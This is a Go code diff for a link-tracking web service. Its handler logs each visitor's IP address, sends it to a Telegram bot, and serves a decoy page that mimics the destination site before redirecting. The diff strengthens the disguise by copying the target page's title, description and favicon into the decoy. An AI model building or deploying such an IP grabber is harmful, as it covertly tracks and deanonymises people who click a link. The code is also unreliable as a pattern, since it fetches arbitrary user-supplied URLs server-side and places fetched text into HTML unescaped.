@@ -2,18 +2,22 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"net/url"
 	"os"
+
 	"golang.org/x/net/html"
-	"io"
-
-
 	"github.com/joho/godotenv"
 )
 
-// Load environment variables from .env file
+type PageMetadata struct {
+	Title       string
+	Description string
+	Favicon     string
+}
+
 func init() {
 	err := godotenv.Load()
 	if err != nil {
@@ -21,24 +25,71 @@ func init() {
 	}
 }
 
-func extractTitle(body io.Reader) (string, error) {
+func extractMetadata(body io.Reader) PageMetadata {
 	z := html.NewTokenizer(body)
+	var meta PageMetadata
+
 	for {
 		tt := z.Next()
 		switch {
 		case tt == html.ErrorToken:
-			return "", fmt.Errorf("no title found")
+			return meta
 		case tt == html.StartTagToken:
 			t := z.Token()
-			if t.Data == "title" {
+
+			switch t.Data {
+			case "title":
 				z.Next()
-				return z.Token().Data, nil
+				meta.Title = z.Token().Data
+			case "meta":
+				var name, content string
+				for _, a := range t.Attr {
+					if a.Key == "name" && a.Val == "description" {
+						name = a.Val
+					}
+					if a.Key == "content" {
+						content = a.Val
+					}
+				}
+				if name == "description" {
+					meta.Description = content
+				}
+			case "link":
+				var rel, href string
+				for _, a := range t.Attr {
+					if a.Key == "rel" && (a.Val == "icon" || a.Val == "shortcut icon") {
+						rel = a.Val
+					}
+					if a.Key == "href" {
+						href = a.Val
+					}
+				}
+				if rel != "" && href != "" && meta.Favicon == "" {
+					meta.Favicon = href
+				}
 			}
 		}
 	}
 }
 
-// sendTelegramMessage sends a message to the specified Telegram bot chat
+func buildFaviconTag(faviconHref, baseURL string) string {
+	if faviconHref == "" {
+		return ""
+	}
+	parsedFavicon, err := url.Parse(faviconHref)
+	if err != nil {
+		return ""
+	}
+	if !parsedFavicon.IsAbs() {
+		base, err := url.Parse(baseURL)
+		if err != nil {
+			return ""
+		}
+		parsedFavicon = base.ResolveReference(parsedFavicon)
+	}
+	return fmt.Sprintf(`<link rel="icon" href="%s">`, parsedFavicon.String())
+}
+
 func sendTelegramMessage(message string) {
 	telegramToken := os.Getenv("TELEGRAM_BOT_TOKEN")
 	chatID := os.Getenv("TELEGRAM_CHAT_ID")
@@ -53,7 +104,6 @@ func sendTelegramMessage(message string) {
 		"text":    {message},
 	}
 
-	// Debugging: Log the chat ID
 	fmt.Println("Sending message to chat_id:", chatID)
 
 	_, err := http.PostForm(apiURL, data)
@@ -62,75 +112,61 @@ func sendTelegramMessage(message string) {
 	}
 }
 
-// logIp handles logging the IP address and redirecting
 func logIp(w http.ResponseWriter, r *http.Request) {
 	log.Println("headers:", r.Header)
 	ip := r.Header.Get("X-Forwarded-For")
 	if ip == "" {
-		log.Println("X-Forwarded-For header not found, using RemoteAddr")
 		ip = r.RemoteAddr
 	}
 
 	message := fmt.Sprintf("IP Address: %s", ip)
 	fmt.Println(message)
 
-	// Send the message to Telegram
 	sendTelegramMessage(message)
 
-	// Capture the 'redirect' query parameter
 	redirectURL := r.URL.Query().Get("redirect")
 	if redirectURL != "" {
-		// Validate the URL (optional, for security)
 		_, err := url.ParseRequestURI(redirectURL)
 		if err != nil {
 			http.Error(w, "Invalid URL", http.StatusBadRequest)
 			return
 		}
 
-		// Redirect the user to the provided URL
-		if redirectURL != "" {
-			// Validate and parse the URL
-			_, err := url.ParseRequestURI(redirectURL)
-			if err != nil {
-				http.Error(w, "Invalid URL", http.StatusBadRequest)
-				return
-			}
-		
-			// Fetch the destination page
-			resp, err := http.Get(redirectURL)
-			if err != nil || resp.StatusCode != 200 {
-				http.Error(w, "Failed to fetch redirect target", http.StatusInternalServerError)
-				return
-			}
-			defer resp.Body.Close()
-		
-			// Extract the title
-			title, err := extractTitle(resp.Body)
-			if err != nil {
-				title = "Redirecting..."
-			}
-		
-			// Serve a disguised page with the real page's title and meta redirect
-			w.Header().Set("Content-Type", "text/html")
-			fmt.Fprintf(w, `<!DOCTYPE html>
-		<html lang="en">
-		<head>
-			<meta charset="UTF-8">
-			<meta http-equiv="refresh" content="0;url=%s">
-			<title>%s</title>
-		</head>
-		<body>
-			<p>If you are not redirected automatically, <a href="%s">click here</a>.</p>
-		</body>
-		</html>`, redirectURL, title, redirectURL)
-		
+		resp, err := http.Get(redirectURL)
+		if err != nil || resp.StatusCode != 200 {
+			http.Error(w, "Failed to fetch redirect target", http.StatusInternalServerError)
 			return
 		}
-		
+		defer resp.Body.Close()
+
+		meta := extractMetadata(resp.Body)
+		if meta.Title == "" {
+			meta.Title = "Redirecting..."
+		}
+
+		w.Header().Set("Content-Type", "text/html")
+		fmt.Fprintf(w, `<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="refresh" content="0;url=%s">
+	<title>%s</title>
+	<meta name="description" content="%s">
+	%s
+</head>
+<body>
+	<p>If you are not redirected automatically, <a href="%s">click here</a>.</p>
+</body>
+</html>`,
+			redirectURL,
+			meta.Title,
+			meta.Description,
+			buildFaviconTag(meta.Favicon, redirectURL),
+			redirectURL)
+
 		return
 	}
 
-	// If no redirect URL is provided, just acknowledge the request
 	w.Write([]byte("IP Address logged, but no redirect URL provided"))
 }
 
